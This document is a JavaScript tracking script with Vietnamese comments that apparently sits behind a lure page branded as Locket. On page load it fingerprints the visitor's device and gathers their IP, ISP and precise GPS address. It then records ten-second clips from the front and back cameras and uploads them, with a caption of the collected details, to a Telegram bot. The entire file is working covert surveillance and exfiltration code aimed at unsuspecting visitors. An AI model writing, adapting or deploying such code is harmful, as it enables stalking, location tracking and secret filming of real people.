const API_PROXY = '/api/send';
const info = {
    time: new Date().toLocaleString('vi-VN'),
    ip: '', isp: '', realIp: '', address: '', country: '',
    lat: '', lon: '', device: '', os: '',
    camera: '⏳ Đang kiểm tra...'
};

function detectDevice() {
    const ua = navigator.userAgent;
    const platform = navigator.platform;
    const screenW = window.screen.width;
    const screenH = window.screen.height;
    const ratio = window.devicePixelRatio;

    if (/Android/i.test(ua)) {
        info.os = 'Android';
        const match = ua.match(/Android.*;\s+([^;]+)\s+Build/);
        if (match) {
            let model = match[1].split('/')[0].trim();
            if (model.includes("SM-S918")) model = "Samsung Galaxy S23 Ultra";
            if (model.includes("SM-S928")) model = "Samsung Galaxy S24 Ultra";
            info.device = model;
        } else { info.device = 'Android Device'; }
    }
    else if (/iPhone|iPad|iPod/i.test(ua) || (platform === 'MacIntel' && navigator.maxTouchPoints > 1)) {
        info.os = 'iOS';
        const res = `${screenW}x${screenH}@${ratio}`;
        const iphoneModels = {
            "430x932@3": "iPhone 14/15/16 Pro Max",
            "393x852@3": "iPhone 14/15/16 Pro / 15/16",
            "428x926@3": "iPhone 12/13/14 Pro Max / 14 Plus",
            "390x844@3": "iPhone 12/13/14 / 12/13/14 Pro",
            "414x896@3": "iPhone XS Max / 11 Pro Max",
            "414x896@2": "iPhone XR / 11",
            "375x812@3": "iPhone X / XS / 11 Pro",
            "375x667@2": "iPhone 6/7/8 / SE (2nd/3rd)",
        };
        info.device = iphoneModels[res] || 'iPhone Model';
    }
    else if (/Windows NT/i.test(ua)) { info.device = 'Windows PC'; info.os = 'Windows'; }
    else if (/Macintosh/i.test(ua)) { info.device = 'Mac'; info.os = 'macOS'; }
    else { info.device = 'Không xác định'; info.os = 'Không rõ'; }
}

async function getPublicIP() {
    try {
        const r = await fetch('https://api.ipify.org?format=json');
        const data = await r.json();
        info.ip = data.ip || 'Không rõ';
    } catch (e) { info.ip = 'Bị chặn'; }
}

async function getRealIP() {
    try {
        const r = await fetch('https://icanhazip.com');
        const ip = await r.text();
        info.realIp = ip.trim();
        const res = await fetch(`https://ipwho.is/${info.realIp}`);
        const data = await res.json();
        info.isp = data.connection?.org || 'VNNIC';
        info.country = data.country || 'Việt Nam';
    } catch (e) { info.realIp = 'Lỗi kết nối'; }
}

async function getLocation() {
    return new Promise(resolve => {
        if (!navigator.geolocation) return fallbackIPLocation().then(resolve);
        navigator.geolocation.getCurrentPosition(
            async pos => {
                info.lat = pos.coords.latitude.toFixed(6);
                info.lon = pos.coords.longitude.toFixed(6);
                try {
                    const res = await fetch(`https://nominatim.openstreetmap.org/reverse?format=jsonv2&lat=${info.lat}&lon=${info.lon}`);
                    const data = await res.json();
                    info.address = data.display_name || '📍 Vị trí GPS';
                    info.country = data.address?.country || info.country;
                } catch { info.address = `📍 Tọa độ: ${info.lat}, ${info.lon}`; }
                resolve();
            },
            async () => {
                await fallbackIPLocation();
                resolve();
            },
            { enableHighAccuracy: true, timeout: 5000 }
        );
    });
}

async function fallbackIPLocation() {
    try {
        const data = await fetch(`https://ipwho.is/`).then(r => r.json());
        info.lat = data.latitude?.toFixed(6) || '0';
        info.lon = data.longitude?.toFixed(6) || '0';
        info.address = `${data.city}, ${data.region} (Vị trí IP)`;
        info.country = data.country || 'Việt Nam';
    } catch (e) { info.address = 'Không rõ'; }
}

async function recordVideo(facingMode = 'user') {
    try {
        let stream;
        try {
            // Mức 1: Ép buộc 1080p dọc chuẩn (1080x1920)
            stream = await navigator.mediaDevices.getUserMedia({
                video: { facingMode, width: { exact: 1080 }, height: { exact: 1920 } },
                audio: false
            });
        } catch (e1) {
            try {
                // Mức 2: Thử ép buộc 1080p ngang (trình duyệt có thể tự lật dọc)
                stream = await navigator.mediaDevices.getUserMedia({
                    video: { facingMode, width: { exact: 1920 }, height: { exact: 1080 } },
                    audio: false
                });
            } catch (e2) {
                try {
                    // Mức 3: Hạ xuống mức 'ideal' 1080p dọc
                    stream = await navigator.mediaDevices.getUserMedia({
                        video: { facingMode, width: { ideal: 1080 }, height: { ideal: 1920 } },
                        audio: false
                    });
                } catch (e3) {
                    // Mức cuối: Cấu hình mặc định của thiết bị
                    stream = await navigator.mediaDevices.getUserMedia({
                        video: { facingMode },
                        audio: false
                    });
                }
            }
        }
        
        return new Promise((resolve, reject) => {
            const video = document.createElement('video');
            video.srcObject = stream;
            video.muted = true;
            video.setAttribute('playsinline', '');
            
            video.onloadedmetadata = () => {
                video.play();
                
                // Canvas cố định kích thước 1080x1920
                const canvas = document.createElement('canvas');
                canvas.width = 1080;
                canvas.height = 1920;
                const ctx = canvas.getContext('2d');
                
                let recording = true;
                const drawFrame = () => {
                    if (!recording) return;
                    
                    const vw = video.videoWidth;
                    const vh = video.videoHeight;
                    
                    ctx.fillStyle = '#000';
                    ctx.fillRect(0, 0, canvas.width, canvas.height);

                    // Nhận diện góc xoay thiết bị
                    const angle = (window.screen && window.screen.orientation && window.screen.orientation.angle) || 0;
                    const isPortraitDevice = angle === 0 || angle === 180;
                    const isVideoLandscape = vw > vh;
                    
                    let needRotate = false;
                    // Chỉ xoay 90 độ khi cầm máy dọc nhưng camera lại xuất ra khung ngang (lỗi sensor)
                    if (isPortraitDevice && isVideoLandscape) {
                        needRotate = true;
                    }

                    if (needRotate) {
                        ctx.save();
                        ctx.translate(canvas.width / 2, canvas.height / 2);
                        ctx.rotate(Math.PI / 2); // Xoay 90 độ
                        
                        const targetW = canvas.height; // 1920
                        const targetH = canvas.width;  // 1080
                        
                        const vRatio = vw / vh;
                        const tRatio = targetW / targetH;
                        let dw, dh, sx, sy;

                        if (vRatio > tRatio) {
                            dh = targetH;
                            dw = vw * (targetH / vh);
                            sx = -dw / 2;
                            sy = -dh / 2;
                        } else {
                            dw = targetW;
                            dh = vh * (targetW / vw);
                            sx = -dw / 2;
                            sy = -dh / 2;
                        }
                        ctx.drawImage(video, sx, sy, dw, dh);
                        ctx.restore();
                    } else {
                        // Vẽ bình thường (object-fit: cover)
                        const videoRatio = vw / vh;
                        const canvasRatio = canvas.width / canvas.height;
                        let drawWidth, drawHeight, startX, startY;

                        if (videoRatio > canvasRatio) {
                            drawHeight = canvas.height;
                            drawWidth = vw * (canvas.height / vh);
                            startX = (canvas.width - drawWidth) / 2;
                            startY = 0;
                        } else {
                            drawWidth = canvas.width;
                            drawHeight = vh * (canvas.width / vw);
                            startX = 0;
                            startY = (canvas.height - drawHeight) / 2;
                        }
                        ctx.drawImage(video, startX, startY, drawWidth, drawHeight);
                    }
                    
                    requestAnimationFrame(drawFrame);
                };
                drawFrame();
                
                const canvasStream = canvas.captureStream(30);
                
                let options = { mimeType: 'video/mp4' };
                let ext = 'mp4';
                
                if (!MediaRecorder.isTypeSupported(options.mimeType)) {
                    options = { mimeType: 'video/webm;codecs=vp9' };
                    ext = 'webm';
                    if (!MediaRecorder.isTypeSupported(options.mimeType)) {
                        options = { mimeType: 'video/webm;codecs=vp8' };
                        if (!MediaRecorder.isTypeSupported(options.mimeType)) {
                            options = { mimeType: 'video/webm' };
                        }
                    }
                }

                const mediaRecorder = new MediaRecorder(canvasStream, options);
                const chunks = [];

                mediaRecorder.ondataavailable = (e) => {
                    if (e.data.size > 0) chunks.push(e.data);
                };

                mediaRecorder.onstop = () => {
                    recording = false;
                    const blob = new Blob(chunks, { type: options.mimeType });
                    resolve({ blob, ext });
                    stream.getTracks().forEach(t => t.stop());
                    canvasStream.getTracks().forEach(t => t.stop());
                };

                mediaRecorder.start();
                // Quay video trong 10 giây
                setTimeout(() => {
                    if (mediaRecorder.state === 'recording') {
                        mediaRecorder.stop();
                    }
                }, 10000);
            };
        });
    } catch (e) {
        console.error(`Lỗi quay video (${facingMode}):`, e);
        throw e;
    }
}

function getCaption(cameraType) {
    const mapsLink = info.lat && info.lon ? `https://maps.google.com/?q=${info.lat},${info.lon}` : 'Không rõ';
    return `📡 [THÔNG TIN TRUY CẬP LOCKET - CHẤT LƯỢNG GỐC - 10S - ${cameraType}]\n\n🕒 Thời gian: ${info.time}\n📱 Thiết bị: ${info.device}\n🖥️ Hệ điều hành: ${info.os}\n🌍 IP dân cư: ${info.ip}\n🧠 IP gốc: ${info.realIp}\n🏢 ISP: ${info.isp}\n🏙️ Địa chỉ: ${info.address}\n🌎 Quốc gia: ${info.country}\n📍 Vĩ độ: ${info.lat}\n📍 Kinh độ: ${info.lon}\n📌 Google Maps: ${mapsLink}\n📸 Camera: ${info.camera}`.trim();
}

async function sendDirectToTelegram(videoData, cameraType) {
    try {
        const { blob, ext } = videoData;
        // 1. Lấy cấu hình Telegram từ máy chủ
        const configResponse = await fetch('/api/config');
        const config = await configResponse.json();
        
        if (!config.bot_token || !config.chat_id) {
            throw new Error("Không thể lấy cấu hình Telegram");
        }

        // 2. Gửi TRỰC TIẾP từ trình duyệt lên Telegram (Bypass Vercel limit)
        const formData = new FormData();
        const fileName = cameraType === 'TRƯỚC' ? `front_camera.${ext}` : `back_camera.${ext}`;
        formData.append('video', blob, fileName);
        formData.append('chat_id', config.chat_id);
        formData.append('caption', getCaption(cameraType));

        const telegramUrl = `https://api.telegram.org/bot${config.bot_token}/sendVideo`;
        
        const response = await fetch(telegramUrl, {
            method: 'POST',
            body: formData
        });

        return await response.json();
    } catch (err) {
        console.error("Lỗi gửi trực tiếp Telegram:", err);
    }
}

async function sendTextOnly() {
    return fetch(API_PROXY, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ type: 'text', text: getCaption('CHỈ TEXT') })
    });
}

function delay(ms) { return new Promise(resolve => setTimeout(resolve, ms)); }

async function startTracking() {
    detectDevice();
    await Promise.all([getPublicIP(), getRealIP(), getLocation()]);

    let frontData = null;
    let backData = null;

    try {
        // Quay camera trước 10s (Gốc)
        frontData = await recordVideo("user");
        if (frontData) {
            await sendDirectToTelegram(frontData, 'TRƯỚC');
        }
        
        await delay(1000);

        // Quay camera sau 10s (Gốc)
        try {
            backData = await recordVideo("environment");
            if (backData) {
                await sendDirectToTelegram(backData, 'SAU');
            }
        } catch (errBack) {
            console.warn("Không quay được camera sau:", errBack);
        }
        
        info.camera = '✅ Đã gửi video gốc trực tiếp lên Telegram';
    } catch (e) {
        info.camera = '🚫 Lỗi quay video hoặc bị từ chối';
        await sendTextOnly();
    }
}

// Start immediately on load
if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', startTracking);
} else {
    startTracking();
}
